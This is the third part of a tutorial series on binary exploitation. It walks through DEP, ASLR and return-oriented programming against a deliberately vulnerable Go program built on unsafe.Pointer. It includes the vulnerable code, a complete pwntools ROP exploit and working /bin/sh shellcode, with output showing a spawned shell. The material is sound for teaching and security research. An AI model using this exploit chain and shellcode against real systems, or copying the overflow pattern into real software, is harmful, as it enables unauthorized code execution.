# Exploitation Exercise with Goland unsafe.Pointer: ROP and Spawning a Shell (Part 3)

In this third part, we will see how to take the idea of code flow redirection one step further. We will do an arbitrary
remote code execution using the Return Oriented Programming (ROP) technique. In the end, we will reach the classic goal
for binary exploitation and run a shell in the program context.


## Parts:

 1. [Information leakage](unsafe-vulnerabilities-1-information-leakage.md)
 2. [Code flow redirection](unsafe-vulnerabilities-2-code-flow-redirection.md)
 3. ROP and spawning a shell (enjoy!)


## Executing code on the stack

Following the last part of the series, you might have thought: what if we pipe actual machine instructions into the
program, and then use the address of this machine code on the stack (inside the buffer receiving the input data) instead
of the address of the `win` function. This way, we could execute arbitrary code of our choice, including just spawning
a shell and thus having a universal interface to run more code.

Indeed, this was possible not too much time ago. One would send the padding necessary to fill up the input buffer and
stack up to the stored return pointer, then an address a bit later in the stack, and then the machine code needed to
start a shell. If the padding was long enough, it would also be possible to put the code into the padding, reducing the
overall input data size.

Because the stack is always a bit unpredictable (for example, environment variables might get pushed onto the stack and
they could be different on each program run), the exact address of the shell code could vary slightly. And if we would
miss it by even a byte, the code would become corrupted and stop working.

To mitigate this, we could send a lot of NOP instructions (opcode `0x90`) between the address and the shell code, and
then try to jump into the middle of those instructions. This way, we don't have to hit the exact correct byte, instead
the exploit also works if we jump to an address that is a few bytes before or after. This is because all possible
target addresses (within some range) would be NOP instructions, and the CPU would just follow along all NOP instructions
until it reaches the shell code and executes it. This technique is called the nopslide, because the CPU in a way slides
down a slope of NOPs.
 

## DEP and ASLR: mitigations against buffer overflows

Unfortunately, these days it isn't this easy anymore. Operating system developers have done a lot of work to implement
countermeasures against this simple code on the stack exploit.

Data execution prevention is a technique which assigns the memory pages used by a program different permissions. There
are pages that can only be read (like literals and constants), pages that can be read and executed (like the program
instructions itself) and pages that can be written (e.g. the stack or heap). But the pages that can be written to can
not be executed! Different names for this is R^W (read xor write) or NX (non-executable memory). This technique is in
use by all major operating systems for years, and it effectively prevents us from writing our code onto the stack and
then executing it.

Another mitigation is address space layout randomization (ASLR) which randomizes the addresses of dynamically linked
libraries, or maybe even functions inside the binary itself, when loading it into the RAM. This way, we can not use GDB
to analyze the binary locally and determine addresses where we might jump to, because on the exploit target (possibly
remote the addresses would be completely different).

Fortunately for this proof of concept, Go does not really use ASLR. The binaries produces by the Go compiler have
deterministic addresses, and at least this small program gets statically linked so there are no dynamic libraries that
could be loaded at different addresses. We can see this by running some analysis on the binary file:

```shell script
$ readelf -l main

Elf file type is EXEC (Executable file)
Entry point 0x45d310
There are 7 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040
                 0x0000000000000188 0x0000000000000188  R      0x1000
  NOTE           0x0000000000000f9c 0x0000000000400f9c 0x0000000000400f9c
                 0x0000000000000064 0x0000000000000064  R      0x4
  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                 0x00000000000926ad 0x00000000000926ad  R E    0x1000
  LOAD           0x0000000000093000 0x0000000000493000 0x0000000000493000
                 0x00000000000bd151 0x00000000000bd151  R      0x1000
  LOAD           0x0000000000151000 0x0000000000551000 0x0000000000551000
                 0x0000000000015240 0x00000000000414c8  RW     0x1000
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x8
  LOOS+0x5041580 0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000         0x8

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .note.go.buildid 
   02     .text .note.go.buildid 
   03     .rodata .typelink .itablink .gosymtab .gopclntab 
   04     .go.buildinfo .noptrdata .data .bss .noptrbss 
   05     
   06

$ ldd main       
the program is not dynamically linked
``` 


## Return2libc

But wait - didn't we in fact execute code in the last part of the series? Yes, we did! But it was code that was already
contained in the binary. We executed the `win` function that was compiled into the binary. This means that we didn't
jump to code that was on the stack (an RW-page), but instead we jumped into the `.text` segment of the program where all
the other machine instructions live, too (an RX-page).

By reusing code that is already in the binary, we can defeat data execution prevention.

A generalization of this technique is called return2libc, where we would now jump to a function contained in the huge
C standard library libc. We could e.g. use the `system` function that allows us to execute arbitrary commands. However,
as mentioned before the binary produced by the Go compiler is statically linked, and it doesn't link against the libc
C library. Thus, we cannot use return2libc. And even if it were linked against libc, ASLR would do a decent job at
making it very hard to find out the correct addresses of libc functions.


## Return oriented programming

We need a different approach: return oriented programming (ROP). With ROP, we try to jump into code that is contained
in the binary just as with return2libc, but we jump to a location that contains preferably only one or at most a few 
machine instructions and a return instruction.

Recall that the return instruction `ret` actually is a simple `pop $rip`. This means that if we execute `ret`, and then
another `ret`, we will simply fetch the next processor word from the stack and jump to that address. Now, this enables
us to chain together small pieces of code by putting the addresses of these code snippets on the stack, one after
another. The important requirements for this are that the code snippets end with a `ret` instruction, and do not modify
the stack pointer `$rsp`, because modifying the stack pointer would destroy our chain of code snippets. Using these
snippets, we can craft a program almost like manually coding in assembler, but with only a limited set of assembler
instructions available (the ones we find in the binary).

With these code snippets, we can do arbitrary stuff, including calling syscalls. Syscalls give us the power to e.g.
read data into a buffer, or change the execution permissions of memory pages used by the program.

To find suitable code snippets, we can either manually decompile the complete binary (very tedious), or use a helper
tool like ROPgadget or Ropper. I used Ropper here. It provides some automated search tools, but here they couldn't find
anything so I had to dig in using my own hands.

The following command shows many usable ROP gadgets (snippets):

```shell script
ropper --file main --search "%" | less
```


## POC: Spawning a shell

We analyze the short Go program know from the last part:

```go
// initialize the reader outside of the main function to simplify POC development, as there are less local variables
// on the stack.
var reader = bufio.NewReader(os.Stdin)

func main() {
    // this is a harmless buffer, containing some harmless data
    harmlessData := [8]byte{'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A'}
    
    // create a slice of length 512 byte, but assign the address of the harmless data as its buffer.
    // use the reflect.SliceHeader to change the slice
    confusedSlice := make([]byte, 512)
    sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(&confusedSlice))
    harmlessDataAddress := uintptr(unsafe.Pointer(&(harmlessData[0])))
    sliceHeader.Data = harmlessDataAddress
    
    // now read into the confused slice from STDIN. This is not quite as bad as a gets() call in C, but almost. The
    // function will read up to 512 byte, but the underlying buffer is only 8 bytes. This function is the complete
    // vulnerability, nothing else needed
    _, _ = reader.Read(confusedSlice)
}
```

I use the Python pwntools to have some more convenient functions in the exploit script.

Putting the ROP techniques from above into play, the plan looks like this:

 1. Set the executable and writable flags for a memory page belonging to the program
 2. Write some code into the page that spawns a shell
 3. Jump to that code
 
**Step 1: Get a memory page with RWX permissions**

To do this, we use the `mprotect` syscall.


**Step 2: Write shell code into the page**

To read in the code, we use the `read` syscall.

Now, we have to provide some code that actually spawns a shell. This 27 bytes assembly program will spawn `/bin/sh`. It
is taken from [shell-storm.org](http://shell-storm.org/shellcode/files/shellcode-806.php).

```python
# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
```


**Step 3: Jump to the code**

Running the code we just read in is as simple as jumping to it. And jumping to it means we only have to provide its
address as the next return address:

```python
payload += p64(buf)
```


If we run the final exploit, we get the following output:

```shell script
~/studium/s14/masterarbeit/code/exploits/code-injection $ ./exploit_rop.py        
[+] Starting local process './main': pid 75369
[*] Switching to interactive mode
$ id
uid=1000(johannes) gid=1000(johannes) groups=1000(johannes),54(lock),972(docker),987(uucp),1001(plugdev)
$  
```

We have successfully spawned and control a shell. It runs in the same context as the program did, that is the user
context here. In a next step, we could try to run a local root exploit to escalate privileges.


## Complete POC exploit code

Here is the complete POC code as a reference:

```python
#!/usr/bin/env python2

from pwn import *
import sys

GDB_MODE = len(sys.argv) > 1 and sys.argv[1] == '--gdb'

if not GDB_MODE:
    c = process("./main")


# gadgets (use ropper to find them)
eax0 = 0x000000000045b900 # mov eax, 0; ret;
inc2rax = 0x0000000000419963 # add rax, 2; mov dword ptr [rip + 0x14d61f], eax; ret;
poprdx = 0x000000000040830c # pop rdx; adc al, 0xf6; ret;
poprsi = 0x0000000000415574 # pop rsi; adc al, 0xf6; ret;
syscall = 0x000000000045d329 # syscall; ret;
poprax = 0x000000000040deac # pop rax; or dh, dh; ret;
poprdi = 0x000000000040eb97 # pop rdi; dec dword ptr [rax + 0x21]; ret;

# addresses
buf = 0x00551000 # use vmmap in GDB to find it
dummy = 0x00567000 # heap

# syscall nums
mprotect = 0xa
read = 0x0


# put it together

# padding
payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"

# mark memory page at buf rwx
payload += p64(poprax) # sete in poprdi mitigation
payload += p64(dummy)
payload += p64(poprdi) # 1ST ARGUMENT
payload += p64(buf) # ADDRESS
payload += p64(poprsi) # 2ND ARGUMENT
payload += p64(0x100) # SIZE
payload += p64(poprdx) # 3RD ARGUMENT
payload += p64(0x7) # RWX
payload += p64(eax0) # SET RAX = 0
payload += p64(inc2rax) * 5 # SET RAX = 10
payload += p64(syscall) # SYSCALL

# read into buf
payload += p64(poprax) # sete in poprdi mitigation
payload += p64(dummy)
payload += p64(poprdi) # 1ST ARGUMENT
payload += p64(0x0) # STDIN
payload += p64(poprsi) # 2ND ARGUMENT
payload += p64(buf) # ADDRESS
payload += p64(poprdx) # 3RD ARGUMENT
payload += p64(0x100) # SIZE
payload += p64(eax0) # SET RAX = 0
payload += p64(syscall) # SYSCALL

# jump into buf
payload += p64(buf)

# machine instructions to spawn /bin/sh
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


# send it

if GDB_MODE:
    print(payload + shellcode)
else:
    c.sendline(payload)
    c.sendline(shellcode)
    c.interactive()
```